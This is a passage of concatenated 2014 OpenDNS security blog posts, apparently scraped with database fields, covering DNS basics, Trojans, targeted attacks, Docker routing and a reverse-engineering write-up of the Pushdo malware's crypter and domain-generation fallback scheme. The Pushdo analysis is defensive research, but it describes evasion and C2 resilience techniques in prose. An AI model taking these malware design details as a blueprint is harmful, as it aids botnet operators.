The reader, however, is reminded: as malware executes on a system it can do almost anything it’s controller wants.\nCode execution is code execution, regardless if the malware has previously been used for sending spam, creating traffic for DoS attacks, or exfiltrating stolen business secrets to a drop server used by an advanced persistent threat actor during a nation-state sponsored cyber-espionage campaign.\nPrevious versions of Pushdo have used DNS smokescreens, URL path randomization, and DGA fall back techniques for obscuring command and control (C2) communication. Recently, a new variant of the Pushdo implant surfaced which uses a new algorithm to generate domains. In an attempt to sever Pushdo communications for our customers, we reverse engineered the Pushdo sample, isolated functionality which generated domains, and reimplemented the algorithms logic.\nUnpacking the Sample\nGenerally, malware authors tend to not ship their binaries in “plain text”. Once they have written and compiled their creations into an executable, they run it through a tool called a “crypter”. These tools typically cut up the input file into pieces, encrypt them, and place them into another executable which has been specially crafted to reassemble the payload and have it run. These outer shells are updated multiple times per day to evade detection by security software, and many even employ server-side polymorphism on the malware repository, which means each individual victim will receive a distinct copy of the malicious file. It’s not hard to see why naive signature based detection techniques cannot keep up with this style of distribution. In order to recover the inner payload, there are a few things to look for during analysis. In a somewhat half-hearted attempt to guard the inner workings of the crypter, the code which actually reassembles the payload itself needs to be found and decrypted.\nThe first duty of an analyst is to locate this initial production of code. For the Pushdo sample we analyzed, the outer shell was compiled against Microsoft’s MFC. This is both a blessing and a curse. The downside is that MFC applications tend to be a complete mess of events and callbacks, and control flow is not always easy to statically determine. However, the advantage is that the tables of object methods are trivial to find, and so in practice it never takes very long to find suspicious functionality:\nIn this custom window class, we found the function that decrypts the second stage of the crypter. With a little trial and error in a debugger in an isolated environment, the transfer of control can be found with relative ease:  There’s a jump into the middle of some dynamically allocated memory, the first instructions of which are the typical “call/pop” combination so that this code can orient itself and locate all of the information it will need to reassemble the payload. However, debuggers are pretty poor environments for analyzing code, so we dumped out this memory region and imported it back into an IDA database:  We even get to see some of what this stage will be up to — a dab of dynamic import fetching, a hint of memory protection fiddling, and a standard trick of setting up the payload to run using the Windows API UnmapViewOfFile. The thing to remember about this second stage of the crypter is that many of them tend to have a fatal flaw: they will reconstruct the original payload in memory as it was on disk before the crypter ran. Therefore, we don’t need to worry about the details of the bit-smashing done during reassembly. We just need to keep our eye out for PE parsing code… like this:  Sure enough, setting a breakpoint here and investigating the area pointed to by edx, we find the original malware executable. One “.writemem” later in WinDbg and we’ve totally dispatched the crypter.\nReverse Engineering the Communication Mechanisms\nSimilar to previous variants of Pushdo, this sample uses a smokescreen technique in attempts to hide its actual command and control (C2) communications. One rather notable difference between this and previous versions of Pushdo is that this version has moved away from the recognizable URL patterns, such as “/?ptrxcz_”. In addition, gone are the POSTs to vmw.com and youtube.com. Interestingly though, according to domain features from Investigate, the average popularity score for a smokescreen domain in the previous version of Pushdo was 42.45 while the average popularity of a smokescreen domain used by this variant is 39.19; only a slight decrease in average smokescreen domain popularity. OpenDNS has noticed a large increase in queries for all smokescreen domains used by this variant of Pushdo starting around July 4. One such increase is depicted below. The domain resolutions from Pushdo implants could be the cause of this increase.\n\nThe hardcoded list of 100 domains, pictured below, are resolved and contacted using HTTP POST methods. Most of these domains have no ties to the Pushdo malware and are completely legitimate. The actual C2 and benign domains are sent HTTP requests with identical features (data content, static HTTP headers and user-agent, etc). This muddies traffic analysis, potentially causing confusion for some analysts and automated analysis systems.\n\nAfter resolving and contacting the hard coded domains, the sample falls back to algorithmically generated domains with a hardcoded TLD of ‘.kz’. Similar to Cryptolocker, the Pushdo DGA is seeded on time. The algorithm which generates the domains is a shared secret between the threat actor controlling the botnet and the samples being distributed to compromise victim machines. This shared secret provides a layer of protection for the botnet by making its C2 domains a moving target for blacklists and take downs. Once a high level understanding of Pushdo’s call backs were established, deeper analyses were undertaken to fully comprehend how the implant programmatically generated call back domains.\nLoading up the payload Pushdo drops into IDA presents an embarrassment of riches. A cursory glance at the strings shows numerous avenues of initial investigation:  We see all the hallmarks of malicious software: setting runkeys so that the malware will start executing again when the victim’s computer reboots, “svchost.exe” to do some good old-fashioned thread injection, an “http://%s” to reach out to a generated domain name, and even the alphabet used to do Base64 encoding. Since we were focused on finding the DGA, we followed the network related strings first, which led straight to the heart of the matter:  This piece of code was responsible for finding a command and control server, with some backup plans in case of failure. It would first generate the domains for the given day and try to contact them in order. If all of these domains could not be reached, it would try the domains from the previous day. The process continued until either a server responded or until all domains from the previous 30 days had been tried. In the case of continued failure, it would try contacting domains for 15 days in the future as well, finally giving up if none could be reached. All that was left to do was to translate this piece of assembly code into something a little more user friendly, and then hook up this domain generation script into our main malicious domain feed. One crontab entry later, and our customers had complete protection.\nWorking Smarter, Not Just Harder\nThese days, security vendors collect tens if not hundreds of thousands of malware samples daily. It might seem that in the face of such volume, it would not be possible to complete such a detailed analysis on every file. This is correct — it is not possible, but that is not the whole story. Of the malware samples received daily, they are not all *essentially different* from one another. Many, if not most, of the differences are just the daily variations in the crypters used to hide the main payloads. The core malicious functionally changes at a far slower pace, with the exact same malicious binary being distributed for weeks or months at a time. This is where security companies can apply the most pressure.\nBy doing deep analysis like reverse engineering the DGA, we force the malware authors to change a core piece of functionality, or risk losing control of their existing infrastructure. This, in turn, is slower and more error prone than just running their binary through yet another crypter to evade detection for a day, and often doesn’t happen. For example, the differences in the DGA for this version of Pushdo and the first version of the DGA which appeared in 2013 are mostly cosmetic. A few constants in the algorithm changed along with the table of letters used to generate the domain name fragments, but the structure of the algorithm was virtually identical.\nThe image below shows the proactive blocking of a Pushdo C&C domain prior to it ever having been queried by an OpenDNS user.\n\nIn closing, we’d like to thank Alexandru Maximciuc of BitDefender for bringing the new variant to our attention in addition to providing us with the sample to reverse.', 'Malware;Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2014/07/31/pushdo-crypter/');

Last month, I picked apart what a BotNet is (here’s a link for convenience). This week, I’m going to talk about one of the more classic trolls of the malware neighborhood. This particular style of malware has been around since about the 1980s and is still relevant to this day, as the trolls continue to find ways to trick you into downloading and enabling it on your computer. If you guessed “Trojan”, well then you are correct—we’re going to talk about the Trojan.\n\nUnless you’ve been living under that rock, you’ve likely heard the story of the Trojan Horse, which is where the name of this malware was pulled from. Essentially, the Greeks built a giant wooden horse as a trophy to the Trojan army for “winning” the war. Little did those arrogant Trojans know, there was a gang of bruisers hanging out inside that giant wooden statue.\n\nAs you can probably guess, those hidden soldiers eventually broke out and sacked the City of Troy, thus conquering the city, winning the war and eventually having a common type of malware named after the event.\nTrojan malware? Pretty much the same as it is in the story. A file that looks legit so you think it’s legit but IT’S NOT LEGIT! You allow it to enter your City of Troy (a.k.a. computer) where, once executed, it’s free to vandalize whatever part of your computer it was sent out to vandalize. Everything from crashing your computer, keystroke logging (where everything that you type is recorded), using your webcam to look at your face or other things, controlling your computer remotely, using your computer as a proxy for illegal activities and attacks on other computers so you look responsible, deleting and/or altering files, downloading and installing third-party malware, watching your screen from their computer while you use it, activating that damn blue screen of death, making you sad, making you angry, making you confused, etc. All possible by way of the Trojan.\nAccording to the AWGP Trend Reports White Paper for Q1 2014, they state that “Trojans continue to be the most common type of malware, constituting 71.85% of all malware captured during this quarter. PandaLabs’ Collective Intelligence platform found that that almost four out of every five malware infections were caused by Trojans (79.70%).”\nTrojans come packaged in a lot of different forms of executables as well—they’re not just limited to vbs and exe files, although those seem to be the most prominent. They can also be pdf, mp3, mov, jpg, txt… you get the idea. Basically any type of desirable file can be a trojan, which makes them particularly annoying and shitty.\nSome good news out of all of this? Umbrella protects against Trojans. Lots of ’em. Zeus, Ramnit, Android/Gumen, Flame, Renos, FakeAV, I really could go on for a long time. We also, once again, provide you with the tools to pinpoint which computer (or computers) on your network are hosting the source of the activity, should you already be infected with one of these things.\nSo that’s what a Trojan is! Make sense? I sure hope so. If not, you could take it one step further and watch that movie Troy. It’s based around that whole Trojan Horse story and includes Brad Pitt as a demigod who runs around, sword in hand, unconvincingly jump stabbing dudes that are like 3 times his size.\n\nYou could also apply to join the OpenDNS Labs Security Community, which focuses specifically on potentially malicious domains that have been submitted for review (including those related to Trojans) by the community, and in turn helps to protect the millions of OpenDNS users around the world.', 'Security Community;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/07/24/trojan-mean-like-malware/');

You Are Under Attack', 'OpenDNS Team', 'July 22, 2014', 'You may have heard that targeted attacks are on the rise—businesses are constantly under attack. The challenge that security professionals face is too much noise, and at the end of the day, it’s pretty hard to determine whether each event is worth their attention. Many alerts that come in are trivial and won’t severely impact the business, but there are a few that could cause a great deal of damage. It’s critical to have visibility into which ones to respond to first and investigate further.\nWhat are targeted attacks?\nAdvanced attacks aggressively go after specific objectives—they can target your business, or a technology that you’re using. These attacks typically are staged by threat actors who are after data and monetary gain. You may have heard about targeted attacks that were aimed at the point of sale (POS) systems used by Target and Neiman Marcus. This malware infected hundreds of retailers in 40 countries, stealing data on thousands of payment cards. By contrast, exploit kits like Zeus are used in the majority of attacks, impacting millions of Internet users in businesses and at home—and these opportunistic attacks are what create so much noise for security professionals.\nShift your perspective: from prevention to continuous response\nThe current mindset in the security world is to prevent attacks on networks and systems under the control of a business. The reality is that an advanced attack is not obvious and may infiltrate systems outside your control (e.g. through supply chain or technology partnerships), with the objective of launching the attack several steps later. There are so many different types of attacks being launched that it’s safe to assume your business is being exposed to threats, as compromised devices might lead to breaches in critical data systems.\nInstead of thinking in terms of blocking and prevention, take the perspective that you’re under attack, and will likely be breached—the part you can control is the severity and the swiftness of detection and your response. At the 2014 Gartner Security and Risk Management Summit, Eric Ahlm gave a presentation called “With Increased Security Visibility Comes Great Responsibility,” in which he addressed the need within the security industry to shift thinking from “You might get attacked” to “You’re already being attacked. How do you minimize damage from happening again?” The conversation in security is not about “if” but instead, is about detecting attacks and keeping the damage from happening again.\nThe key is to weigh the level of urgency against the business risk posed. This means that even though there may be a high volume of events, you need to assess their impact by examining them in context.\nWhat you can do about it\nOnce you have layered on a few solutions in your security stack, your incident response team is often flooded with events. As a security practitioner, it’s impossible to save all your end users. But you can filter out the noise to focus on the attacks that are causing real harm to your business.\nOpenDNS approaches targeted attacks by profiling how traffic from your devices and networks stacks up against the rest of the world’s traffic. We look at security from a global perspective, comparing traffic to malicious locations often before an attack is launched. By using our predictive intelligence to proactively identify where bad actors are staging their next attack, we can help your business move away from reactive security.', 'Umbrella', 'https://umbrella.cisco.com/blog/2014/07/22/spoiler-alert-attack/');

It’s also possible that the email address used to register the domains was at some point compromised and used to register a domain for malicious use:\n\nSome email addresses registered a balanced mix of good, bad, and benign domains:\n\nSome email addresses were observed to have registered one whitelisted domain, a few blacklisted domains, and a large set of benign domains:\n\nMany groups had a majority of domains in our blacklist with a small minority of sibling domains categorized as benign. These particular groups are interesting as the benign domains (white) are highly suspect:\n\nA large majority of the groups formed looked like the image below. Notice some domains are blacklisted and most are unknown. Having such a large number of domains, with a mix of alignments, sharing a single registrant contact email address is indicative of a proxy registration service. In these cases the sibling domains are likely unrelated to each other:\n\nSimilar to proxy registration email address groupings, abuse desks are another type of large group that are usually comprised of half unknown and half blacklisted domains. The lower right point in the below graphic is an abuse desk email address, while the rest of the nodes are domains registered with that Whois registrant contact email address. Red nodes are known malicious domains, while white nodes are domains with unknown or benign intent. If a domain’s Whois contact email address has recently been changed to a registrar’s abuse desk, chances are the domain has an outstanding abuse complaint and is under investigation:\n\nThough our research into registrant-to-maliciousness has just begun, the initial results look promising enough to continue gathering data and investigating the results.', 'Malware;Security Graph;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2014/07/21/visualizing-domain-registration-relationships-whois/');

With a web front end backed by MongoDB, CRITs provides a central platform for analyzing malware, pcaps, emails, domains and most other artifacts related to an incident. One very powerful feature of the platform is the ability to create plugins called “services” and have plugins communicate metadata to each other.\nThe OpenDNS service for CRITs allows for the querying of OpenDNS’s Investigate API for domains and IP addresses within CRITs. Enabling “run at triage” will automatically kick off queries to the Investigate API whenever a new IP or domain is added to the database.\n\nAnyone who has performed incident response and/or malware analysis in the past knows that pivoting from a Portable Executable (PE) detonated within Cuckoo Sandbox, to a ChopShop decoded IP address extracted from a proprietary malware protocol, to a list of domains which have recently resolved to the IP address, to Whois registrant contact information is a pretty interesting story.

By using DNS, you can connect to a website like opendns.com without having to know the website’s IP address. (After all, who wants to remember every website’s IP address?)\nThis post is focused on the relationship between authoritative and recursive DNS nameservers. If you want to read more about general DNS mechanics, one of our engineers, Phillip Thomas, did an excellent job explaining that in an earlier OpenDNS blog post called “Speed, Security, and Safety Through DNS.”\nWhat is a Recursive DNS Server?\nYou might have been able to guess what a recursive DNS server does by its name—it recurses, which means that it refers back to itself. Recursive DNS nameservers are responsible for providing the proper IP address of the intended domain name to the requesting host. Recursive nameservers are like the phone operator looking up a phone number from multiple phone books on behalf of the requesting party (the users’ computer on behalf of an application), some phone books will list just last names, then other phone books exist per last name, and list first names.\nFor example, when making a request to a website from your browser, the host (computer) will then make a request to recursive DNS server to find the IP address associated with the website; this is assuming your operating system and Web browser do not already have a response cached. From there, the recursive server will check to see if it has a cached DNS record from the authoritative nameserver, and still has a valid time-to-live (TTL). If the recursive server does not have the DNS record cached, it begins the recursive process of going through the authoritative DNS hierarchy, which I will explain further down in this post.\nWhat are Authoritative DNS Nameservers?\nSimply, authoritative DNS nameservers are responsible providing answers to recursive DNS nameservers with the IP “mapping” of the intended website. The authoritative nameservers’ responses to the recursive nameservers contain important information for each domain, such as corresponding IP addresses and other necessary DNS records. Essentially authoritative nameservers are like the Yellow Pages publishing multiple phone books, one per region. Yet they don’t actually create the phone book listings—that’s the responsibility of domain name registrars.\nPutting it Together\nTo better illustrate how both of the nameservers interact with each other, let’s imagine that you are at your computer and you want to search for pictures of cats so you type www.google.com into your Web browser to go to Google. However, your computer doesn’t know where the server for www.google.com is located, so your computer sends a query to a recursive DNS nameserver (OpenDNS) to locate the IP address of the website for you. The recursive DNS nameserver is now assigned the task of finding the IP address of the website you are searching for. If the recursive DNS nameserver does not already have the DNS record cached in it’s system, it will then query the authoritative DNS hierarchy to get the answer.\nEach part of a domain like www.google.com has a specific DNS nameserver (or group of redundant nameservers) that is authoritative.\nAt the top of the tree are the root domain nameservers. Every domain has an implied/hidden “.” at the end that designates the DNS root nameservers at the top of the hierarchy. Root domain nameservers know the IP addresses of the authoritative nameservers that handle DNS queries for the Top Level Domains (TLD) like “.com”, “.edu” or “.gov”. It first asks the root domain nameservers for the IP address of the TLD server, in this case, “.com” (for google.com).\nAfterwards it asks the authoritative server for “.com”, where it can find the “google.com” domain’s authoritative server. Then “google.com” is asked where to find “www.google.com”. Once the IP address is known for the website the recursive DNS server responds to your computer with the appropriate IP address. The end result of which is that you are now happy because you can search pictures of cats all day long.  Below is an illustration of the process:\n\nWhy does this matter?\nThis post was written to generally point out the differences between the two nameservers. However, authoritative DNS outages happen frequently and can be a big problem. But since you are using OpenDNS, in such a case, you have nothing to worry about. OpenDNS uses SmartCache, which fixes the inaccessibility problem and allows people to visit those sites despite the authoritative server outage.', 'Security 101', 'https://umbrella.cisco.com/blog/2014/07/16/difference-authoritative-recursive-dns-nameservers/');

The most active of the DGAs was one that we at OpenDNS identified on the day it was registered – cfs50p1je5ljdfs3p7n17odtuw[dot]biz.\n\nAs you can see, the traffic to the domain starts off with a small number of queries (10) on Thursday, July 10 at around 15:00 UTC. A larger jump to 884 queries doesn’t happen until Friday, July 11 at around 6:00 UTC. At peak (on Friday, July 11th at 10:00 UTC) we see a spike of 10,042 queries for cfs50p1je5ljdfs3p7n17odtuw[dot]biz.\nThe domain in question is associated with a number of IP addresses (as seen below) and have a very low TTL.\n\nThree of the IP addresses have also been identified by OpenDNS Labs over the past week as being malicious. All of the IP addresses associated with the domain are located within the Ukraine.\n\nThe name server (NS) associated with the domain is also highly suspicious. The IP range is associated with AS 3462 and is hosted in Taiwan (TW) – quite the distance from the hosting location in the Ukraine. The IP address is also associated with suspicious name servers for a number of Russian (.ru) servers.  A quick scan of some of the other domains hosted by the IP shows a handful of DGAs and Russian (.ru, .su), Kazakhstan (.kz), and Indian (.in) ccTLDs.\n\nOne last nugget of intel is some of the scoring that OpenDNS assigns to the domain, its associated IPs, and related ASNs.\n\nHopefully this information has helped you better understand the methodologies employed by GoZeus users.

Threats exist everywhere. Just in 2014 alone, we’ve heard about the Heartbleed vulnerability in OpenSSL, the proliferation of remote-access Trojans (RATs), and it’s starting to feel as though there is a major data breach at a prominent company somewhere in the world almost daily.\nAs a result, this has led us into a sense of unease when it comes to how our money and information are handled by organizations whom we’ve trusted to keep them safe. Some out there may feel powerless to do anything about it; paying for items with cash only and hiding your money under a mattress seem almost reasonable when you’ve had to change your credit card number three times in one year.\nThis brings us to the world of security practitioners and information security. These people are tasked with ensuring the confidentiality, integrity and availability of data, which we already know is no easy feat. Not only are people who work in this field responsible for the safety of data, but they’re verifying that the clients and applications that may access said data pass security muster as well. This means finding and closing loopholes in local applications, examining past and present network traffic for any anomalies, and having a deep understanding of existing software vulnerabilities and how threat actors may exploit them.\nWhile a security practitioner may get excited about this kind of talk, this is where the non-technical of us tend to fade away from the conversation. Cross-site scripting vulnerability? Yawn. Goto fail? Yep, you’ve lost me. Unfortunately, our willingness to allow the conversation to shift into the uber-technical leaves the rest of us out, and often without the tools and education needed to protect ourselves, our data, and our company’s data. It’s not a coincidence that most data breaches are a result of human error.\nHowever, the thing to keep in mind is that a malicious actor will not discriminate when it comes to raking in all that they can. You may have seen a few headlines recently stating that there is a shortage of security professionals, and the ones that are already in the field know what they’re up against. How do the rest of us, the non-security practitioners, help out, and keep ourselves and our data safe at the same time?\nThe first thing to keep in mind is that security is about awareness and context. Awareness is making sure that you’re entering your banking details on the correct site, and ensuring that site is using HTTPS. Context is asking yourself “is it a good idea for me to click the odd-looking video link in this Facebook post?”\nWe can use these ideas of awareness and context to protect our own data, as well as the data of the company for which we work. In the same way we don’t hand our kids over to the first creepy old man wearing a t-shirt that says “baby-sitter” on it, we shouldn’t be handing our data or the “keys to our kingdom” over to the bad actors. Here are a few things the non-technical folks can do to help our security practitioner brethren:\nStep up your password game: It is 2014. There is no reason for passwords to be scrawled on post-it notes anymore. There are a number of reputable password managers out there, 1Password and LastPass being two of them, and if you have an account with a service that supports two-factor authentication, turn it on! Gmail has it, as do Facebook and Dropbox, and so does OpenDNS for that matter.\nPassword-lock your screen: This way, nobody walking by your computer while it’s unattended can see any information you don’t want them to see. This will also deter your co-workers/housemates/anybody in close proximity from getting on your computer and changing the desktop wallpaper to an image from My Little Pony.\nGreet people you don’t know: Are you in an office and see somebody walking around you don’t recognize? Ask them if they need help! If your office is anything like OpenDNS HQ, then that person is likely a new employee, and if this is the case, you’ve just met a new co-worker and made them feel welcome. Good on you! If this isn’t the case though, politely direct that person to your front desk or reception area; don’t allow them to walk around your office space willy-nilly.\nKnow your role: Why is this important? Spear-phishing is a method of gaining access to a company by sending a targeted email to an employee and imploring them to give up sensitive information. In my case, I work in our Customer Success department; therefore, I shouldn’t receive any emails asking me to click a link to review company financials, for example. If I do receive such an email, you’d better believe I’m giving it the side-eye and passing it along to one of our in-house security practitioners for review.\nBe more discerning: Don’t be afraid to ask questions of people making requests! Our natural inclination, especially in the workplace, is to be as helpful as possible. In some cases, this results in us giving up too much information. Therefore, if you receive a phone call from somebody wanting sensitive information, don’t be afraid to double-check the caller’s name and role and why they need the information they’re asking for. If you’re dealing with maintenance or a repair person, find out what they need access to, and if their visit was previously scheduled. Otherwise, if the situation seems fishy, there’s a good chance it is.\nCheck your assumptions: Don’t assume you or your company won’t be targeted. In this day and age, there is no such thing as being too big or too small to be breached, and while many threat actors have specific reasons for launching attacks on various organizations (espionage, cyber politics, hacktivism, etc), there are some bad actors that will try to take your company’s website down because it’s Tuesday. Don’t make it easy for them.\nWith that in mind, even if you aren’t a security engineer working on the so-called glamorous technical work (or dirty work, depending on how you look at it), there’s room for all of us in this conversation about security awareness, simply because there is too much at stake. As a consumer, do you want to read about yet another data breach at some large organization with whom you’ve done business? As an employee, do you really want to read about your company’s latest breach and be worried about fielding questions from your customers? I didn’t think so.\nIf you’re a security practitioner reading this, we know your job isn’t easy. You have to have eyes on all systems and applications at all times, you have to filter through terabytes of data to find that needle in the digital haystack, and you have the sobering knowledge that there are very real consequences associated with things that go bump in the cyber night. We’re asking that you help us help you. Let the non-technical people know how we can participate in this conversation, and what we can do to make your daunting job less daunting. You can even make it fun for us! Gamification is an option, as is buddying up with your local marketing department to launch an internal campaign on the importance of cyber security awareness.\nIf you’re a non-technical person reading this, ask lots of questions of your technical brethren and really understand what’s at stake. Is it your company’s reputation? If you’re a business owner, is it your own reputation? How does a data breach affect your bottom line? As a consumer, will you need to go out and replace your credit card again for the fourth time this year? As an employee, will a breach at your company result in decreased revenue, and therefore less room for overall growth?\nIn the end, we’re all security practitioners in some way. At the very least, we all need to think like one because we all want the same thing: for our information to be safe and out of the hands of malicious actors.\nFrom an organizational standpoint, the health of any business today is going to depend in part upon their security posture and the trust that their customers have in them. This is why creating a culture of security awareness among all parties is so imperative. Nobody wants to be caught with their pants down, especially not in a situation where customers’ trust is broken. Since none of us want that, let’s help each other cultivate that culture by asking questions, being patient with one another and understanding that we’re all in this together.', 'Security 101', 'https://umbrella.cisco.com/blog/2014/07/11/creating-culture-security-awareness/');

Your credit ratings, a company’s competitive advantage, and even stock prices are damaged if this data is stolen or manipulated. Let’s break down how cyber attacks work into three phases—the lure, the exploit, and the callback—and see how these steps are becoming more targeted with advanced threats.\n\n1. The Lure\nIn Terminator 2, the target was John Conner. The T-1000 cyborg did its homework to know where he lived, and from his home, impersonated his stepmom’s voice in an attempt to lure him in.\nMost targeted cyber attacks also use reconnaissance on specific individuals, companies or industries to increase the likelihood that the lure will work. Most lures rely on social engineering, but some, like “watering hole” attacks, simply rely on the predictability of their target.\nThe lure is linked to a threat (see next phase), which must be hosted or delivered from somewhere on the Internet. The attacker either builds new or compromises existing infrastructure (e.g. IP addresses, domain names). More advanced threats are smart enough to hide from anyone that is not the target.\nTo prevent the lure, many security solutions attempt to block known bad or less reputable websites or emails. This approach is reactive based on collecting data from past attacks, and is often too late to be effective.\n\n2. The Exploit\nIn The Naked Gun, the target was Queen Elizabeth. Reggie Jackson was programmed to assassinate her, but acted normally because he had been hypnotized so that people would trust him.\nThis phase is all about code exploiting other code. Many of today’s advanced threats are programmed to act benign at first to bypass security checks that happen only at a single point of time (e.g. when something passes through a firewall or runs on the device). Attackers either build or buy a threat to exploit vulnerable software (e.g. Java, Flash). Targeted attacks often use previously undiscovered (a.k.a zero-day) vulnerabilities. In these attacks, regularly patching software to stay up-to-date is not enough.\nTo prevent the exploit, many security solutions attempt to scan for code that looks malicious, or scan for actions that behave maliciously. In both device and network activity, the techniques are reactive. Other solutions are more proactive. Isolating applications from accessing sensitive data can help, but these are often complex and expensive solutions to setup. Forcing users to approve unknown or suspicious behaviors can help, yet tend to flood users. Over time, users just click OK without even thinking.\n\n3. The Callback\nIn Batman Returns, the target was Batman. The Penguin exploited the Batmobile by hiring a henchman to set up remote control, then manipulated the car with the intent of damaging Batman’s reputation.\nCyber attacks must also remotely control infected devices to reach their ultimate goal–the data. To control thousands of devices and avoid disruptions, attackers require resilient CnC (command and control) infrastructures to manipulate their botnets (i.e. robot networks of infected devices). Advanced attacks often use techniques such as “fast-flux networks” or “domain-generation algorithms” to keep changing the callback’s destination by IP address or domain name, and/or use covert communication channels to blend in with normal traffic. Advanced threats often go around defenses by waiting until users take infected devices outside a company’s secure perimeter, where the devices are less protected.\nTo contain the callback, many organizations use the same solutions that attempted to prevent the lure. Besides being reactive, these solutions often have no visibility to the callback communication. Other solutions first rely on reverse engineering the threat or collecting  past attack data to discover the callback IPs or domains–another slow, reactive approach.\n\nThe Predictive Approach\nIn Minority Report, Precrime police officers acquire data from the Precogs’ visions, then “scrub” this predictive data to pinpoint the location of future targeted attacks.\nBusiness, large and small, will continue to fall victim to targeted attacks, but there is hope! In our new information age, we now have the ability to acquire and analyze massive amounts of data—petabytes even. These attacks have a weak spot—global networks (like “Precogs”) can observe bad actors’ infrastructures being staged on the Internet before the attack begins. Using a satellite-like vantage point to acquire a global cross-section of all activity on the Internet, both in the past and present, big-data analytics and machine learning technologies have the power to correlate and extrapolate (similar to “scrubbing”) where these infrastructures are located. While we likely will never achieve 100% prevention of targeted attacks, OpenDNS’s predictive approach can uniquely contain many of these attacks’ callbacks from stealing or manipulating our data.', 'Labs Research', 'https://umbrella.cisco.com/blog/2014/07/08/targeted-attacks-penguins-cyborgs-athletes/');

Hands-on experience is one of the best ways to gain knowledge, and you definitely get plenty of that at OpenDNS, with some great mentors to look up to and be inspired by constantly.\nCool Projects\nBeing at a small startup allows us the chance to wear many different hats, as Kevin would say. We’ve had the chance to work on many cool projects. Several of the projects have involved the OpenDNS Security Graph, which is a very large database of all IP addresses, domain names, ASNs, and their associated co-occurrences, internal security scores, etc. One project in particular was to add different sources of information about the domains being queried. Another involved writing APIs for the Security Graph in different programming and scripting languages.\nOther projects have involved creating tools to automate the white and black listings of domains deemed to be either malicious or not to the internal servers, writing web scrapers to gather information to be analyzed so it can be added to our preemptive threat datasets, as well as document parsers to so that we can cover as much area as it takes to stay out in front of potentially harmful domains, ips, and urls.\nOverall, these projects have been very fascinating and educational. We have learned a lot about internet security, and how OpenDNS manages to protect all of its users from malicious hosts. Most importantly, a benefit of working for a startup is that our contributions actually feel meaningful to the company. We look forward to our days ahead at OpenDNS, and all of the exciting projects they have planned for us.\nImage source: http://www.dvdsreleasedates.com/movies/5748/The-Internship-2013.html', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2014/07/01/security-internship/');

Minor issues like having the wrong version of a small software library can take a whole application offline. To create a smooth transition from development to operations with regard to dependencies, environment, and testing OpenDNS has adopted open-source Docker containerization technology.  Interfacing Docker containers with existing dedicated infrastructure across 23 data centers provided a unique set of routing challenges which we solved with  clever application of Generic Routing Encapsulation and Border Gateway Protocol.\nContainers\nContainerization  brings operating system-level virtualization. Compared to tools like VMware, this direct access to the system kernel brings improved speed. Docker specifically brings Git-levels of simplicity to managing system images. In short, packaging applications in Docker takes the guess work out of deployments by replicating the exact same environment between development and production.\nImpetus at OpenDNS\nContainerization at OpenDNS started as a hackathon project in August 2013 when a team built a small platform system to demonstrate its benefits. Since then, an OpenDNS Engineering Infrastructure team has built a comprehensive platform as a service (PaaS) based on Docker. By abstracting away the underlying infrastructure, engineering can focus on development rather than dependency management and monitoring. The PaaS itself implements service methodologies from the Twelve-factor app.\nThe OpenDNS Global Network includes 23 data centers plus significant cloud infrastructure in  Amazon Web Services (AWS). Routing network traffic between these hardware and cloud infrastructures poses a challenge, and the OpenDNS PaaS project began as a way to replicate the performance of dedicated hardware systems in cloud networks like AWS. Described below is an experiment in routing around one of those limitations.\nThe Problem\nOpenDNS sought to be able to run hundreds of containers, each potentially having a privately-routable IP address, on a single EC2 host.  The problem is that an EC2 instance can have a limited number of secondary IP addresses.\nTwo Quick Definitions\nGeneric Routing Encapsulation (GRE) is used to encapsulate a protocol and route it over IP. In our solution we encapsulate an IP packet inside of another IP packet. This allows us to build tunnels through third party networks.\nBorder Gateway Protocol (BGP) ( is a routing protocol used to announce reachability of IP networks. This protocol is most frequently used between ISPs. Below we’ll be using it between one of our routers and EC2 instances.\nA Solution\nOur solution was to use GRE to create an overlay network spanning OpenDNS’s network and our AWS Virtual Private Cloud (VPC) to get around routing limitations in EC2.\nThe first approach was to allocate and statically route /24 prefixes (allocated from a larger block, e.g. 10.0.0.0/16) to individual docker hosts running in EC2. This would give us sufficient IP addresses to support 250 containers with unique IPs per host.\nExtending this concept, we used BGP sessions between each docker host and our router. Each host announces its own address space. This allowed us to go from a single large prefix to individual /32s with minimal configuration on the router. Using Quagga as a BGP daemon on our docker hosts allowed us to redistribute /32s from the hosts’ routing table into BGP. Tools like Pipework could be used here to wire up container IPs and the routing table with Quagga automatically announcing these via BGP.\n\nPowerful\nMoving a container from one host to another host becomes straightforward in this scenario.  Replicate the container on a new host and assign it the prior IP address, then afterward destroy the old container.  The BGP routes converge  within a couple of seconds to re-route traffic.\nWhat happens if you don’t take the old container down and there are two containers with the same IP address?  Load balancing!  Most routers can be configured for Equal-Cost Multi-Path (ECMP) routing to accomplish this.\nThis leads to powerful options such as creating fault tolerant active-active load balancing across multiple hosts, as well as using anycast across our hybrid environment which we discussed in a previous blog post.\nNext Steps\nUtilizing Docker has made operating distributed computing systems between dedicated and cloud data centers transparent. As our internal PaaS tools evolve, we continue to automate more tasks. For instance, we configure the GRE tunnels and BGP peers on each docker host and router manually.  This is not scalable and we need to look at how to automate this. We used BGP as our dynamic routing protocol but we could explore OSPF as an alternative. We have been using private IP address space in our tests but we would also like to experiment with using public IP addresses in the same way. Lastly, we are excited to start using IPv6 addresses in our containers on EC2 and truly remove any address limitations.\nWe’d love to hear from you if you’re using a similar method or have alternate solutions!', 'Docker;Security Engineering', 'https://umbrella.cisco.com/blog/2014/07/01/ip-routing-aws-docker/');

A NODATA response means there are records for the requested domain name, but none of them match the record type in your request.\nAt OpenDNS we want to help prepare everyone for the coming dual-stacked (meaning hosts will have both IPv4 and IPv6 addresses) world. In my previous post I discussed some of the issues that come from use searching domains with a dual stack host. In this post I’ll be going over exactly what DNS responses of NXDOMAIN vs NODATA mean, and why this it is important for people running dual-stacked machines to understand.\nThere is a common misconception about what an authoritative server is actually trying to tell you when you receive an NXDOMAIN response. The NXDOMAIN response is meant to imply  that there are no records, of any request type, for the requested domain name. Effectively, it’s the authority’s way of saying: “I have no information about this domain, regardless of what type of information you’re looking for”. The slightly different, but similar response of NODATA is meant to imply, there is no information, of the requested type, for the requested domain name. This is effectively like the authority saying: “I have information about the requested domain, but none of that information matches the specific type of information you’ve asked for”.\nA good example of when a NODATA response is used is when requesting the A (IPv4) record for “www.ipv6.awfulhak.org”. The host www.ipv6.awfulhak.org is used for testing IPv6 enabled computers, specifically because it’s 